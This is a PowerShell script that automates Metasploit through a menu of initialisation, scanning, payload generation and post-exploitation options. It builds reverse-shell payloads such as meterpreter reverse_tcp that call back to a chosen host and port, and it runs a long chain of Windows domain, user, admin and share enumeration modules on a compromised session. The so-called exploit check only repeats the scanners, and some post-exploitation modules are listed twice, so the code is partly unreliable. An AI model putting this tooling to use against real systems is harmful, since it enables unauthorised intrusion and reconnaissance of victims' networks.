# Metasploit Automation Script

# Import required modules
Import-Module PSLogging

# Initialize logging
$logPath = "C:\SecurityTools\Logs\metasploit_automation_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').log"
Start-Log -LogPath $logPath -LogLevel Info

# Function to initialize Metasploit
function Initialize-Metasploit {
    Write-Log -Message "Initializing Metasploit" -Level Info
    Write-Host "Initializing Metasploit..." -ForegroundColor Green
    
    # Start PostgreSQL service
    Start-Service postgresql-x64-14
    Write-Log -Message "PostgreSQL service started" -Level Info
    
    # Initialize Metasploit database
    msfdb init
    Write-Log -Message "Metasploit database initialized" -Level Info
    
    # Update Metasploit
    msfupdate
    Write-Log -Message "Metasploit updated" -Level Info
}

# Function to perform vulnerability scan
function Start-VulnScan {
    param (
        [string]$Target,
        [string]$OutputFile
    )
    
    Write-Log -Message "Starting vulnerability scan of $Target" -Level Info
    Write-Host "Starting vulnerability scan..." -ForegroundColor Green
    
    # Create resource file for scan
    $resourceFile = "C:\SecurityTools\Configs\msf_scan_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').rc"
    @"
workspace -a $Target
db_nmap -sV -sC $Target
use auxiliary/scanner/portscan/tcp
set RHOSTS $Target
run
use auxiliary/scanner/ssh/ssh_version
set RHOSTS $Target
run
use auxiliary/scanner/smb/smb_version
set RHOSTS $Target
run
use auxiliary/scanner/http/http_version
set RHOSTS $Target
run
use auxiliary/scanner/ssl/ssl_version
set RHOSTS $Target
run
exit
"@ | Out-File -FilePath $resourceFile
    
    # Run scan
    msfconsole -r $resourceFile -o $OutputFile
    
    Write-Log -Message "Vulnerability scan completed. Results saved to $OutputFile" -Level Info
    return $OutputFile
}

# Function to perform exploit check
function Start-ExploitCheck {
    param (
        [string]$Target,
        [string]$OutputFile
    )
    
    Write-Log -Message "Starting exploit check of $Target" -Level Info
    Write-Host "Starting exploit check..." -ForegroundColor Green
    
    # Create resource file for exploit check
    $resourceFile = "C:\SecurityTools\Configs\msf_exploit_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').rc"
    @"
workspace -a $Target
use auxiliary/scanner/portscan/tcp
set RHOSTS $Target
run
use auxiliary/scanner/ssh/ssh_version
set RHOSTS $Target
run
use auxiliary/scanner/smb/smb_version
set RHOSTS $Target
run
use auxiliary/scanner/http/http_version
set RHOSTS $Target
run
use auxiliary/scanner/ssl/ssl_version
set RHOSTS $Target
run
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS $Target
run
use auxiliary/scanner/mysql/mysql_version
set RHOSTS $Target
run
use auxiliary/scanner/postgres/postgres_version
set RHOSTS $Target
run
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS $Target
run
exit
"@ | Out-File -FilePath $resourceFile
    
    # Run exploit check
    msfconsole -r $resourceFile -o $OutputFile
    
    Write-Log -Message "Exploit check completed. Results saved to $OutputFile" -Level Info
    return $OutputFile
}

# Function to perform payload generation
function New-Payload {
    param (
        [string]$Type,
        [string]$OutputFile,
        [string]$LHOST,
        [int]$LPORT
    )
    
    Write-Log -Message "Generating $Type payload" -Level Info
    Write-Host "Generating payload..." -ForegroundColor Green
    
    # Create resource file for payload generation
    $resourceFile = "C:\SecurityTools\Configs\msf_payload_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').rc"
    @"
use payload/$Type
set LHOST $LHOST
set LPORT $LPORT
generate -f raw -o $OutputFile
exit
"@ | Out-File -FilePath $resourceFile
    
    # Generate payload
    msfconsole -r $resourceFile
    
    Write-Log -Message "Payload generated and saved to $OutputFile" -Level Info
    return $OutputFile
}

# Function to perform post-exploitation
function Start-PostExploit {
    param (
        [string]$Session,
        [string]$OutputFile
    )
    
    Write-Log -Message "Starting post-exploitation on session $Session" -Level Info
    Write-Host "Starting post-exploitation..." -ForegroundColor Green
    
    # Create resource file for post-exploitation
    $resourceFile = "C:\SecurityTools\Configs\msf_post_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').rc"
    @"
sessions -i $Session
run post/windows/gather/enum_applications
run post/windows/gather/enum_patches
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
run post/windows/gather/enum_snmp
run post/windows/gather/enum_domain
run post/windows/gather/enum_domain_tokens
run post/windows/gather/enum_domain_group
run post/windows/gather/enum_domain_computers
run post/windows/gather/enum_domain_trusts
run post/windows/gather/enum_domain_shares
run post/windows/gather/enum_domain_admins
run post/windows/gather/enum_domain_controllers
run post/windows/gather/enum_domain_users
run post/windows/gather/enum_domain_groups
run post/windows/gather/enum_domain_computers
run post/windows/gather/enum_domain_trusts
run post/windows/gather/enum_domain_shares
run post/windows/gather/enum_domain_admins
run post/windows/gather/enum_domain_controllers
exit
"@ | Out-File -FilePath $resourceFile
    
    # Run post-exploitation
    msfconsole -r $resourceFile -o $OutputFile
    
    Write-Log -Message "Post-exploitation completed. Results saved to $OutputFile" -Level Info
    return $OutputFile
}

# Main menu
function Show-Menu {
    Write-Host "`nMetasploit Automation Menu" -ForegroundColor Cyan
    Write-Host "1. Initialize Metasploit"
    Write-Host "2. Vulnerability Scan"
    Write-Host "3. Exploit Check"
    Write-Host "4. Generate Payload"
    Write-Host "5. Post-Exploitation"
    Write-Host "6. Exit"
}

# Main execution
try {
    Write-Log -Message "Starting Metasploit automation" -Level Info
    
    do {
        Show-Menu
        $choice = Read-Host "`nSelect an option"
        
        switch ($choice) {
            "1" {
                Initialize-Metasploit
            }
            "2" {
                $target = Read-Host "Enter target (IP or hostname)"
                $outputFile = "C:\SecurityTools\Scans\msf_vuln_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').txt"
                Start-VulnScan -Target $target -OutputFile $outputFile
            }
            "3" {
                $target = Read-Host "Enter target (IP or hostname)"
                $outputFile = "C:\SecurityTools\Scans\msf_exploit_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').txt"
                Start-ExploitCheck -Target $target -OutputFile $outputFile
            }
            "4" {
                $type = Read-Host "Enter payload type (e.g., windows/meterpreter/reverse_tcp)"
                $outputFile = "C:\SecurityTools\Payloads\msf_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').bin"
                $lhost = Read-Host "Enter LHOST"
                $lport = Read-Host "Enter LPORT"
                New-Payload -Type $type -OutputFile $outputFile -LHOST $lhost -LPORT $lport
            }
            "5" {
                $session = Read-Host "Enter session ID"
                $outputFile = "C:\SecurityTools\Scans\msf_post_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').txt"
                Start-PostExploit -Session $session -OutputFile $outputFile
            }
            "6" {
                Write-Log -Message "Exiting Metasploit automation" -Level Info
                Write-Host "Exiting..." -ForegroundColor Yellow
                exit
            }
            default {
                Write-Host "Invalid option. Please try again." -ForegroundColor Red
            }
        }
    } while ($true)
} catch {
    Write-Log -Message "Error during Metasploit automation: $_" -Level Error
    Write-Host "Error: $_" -ForegroundColor Red
} 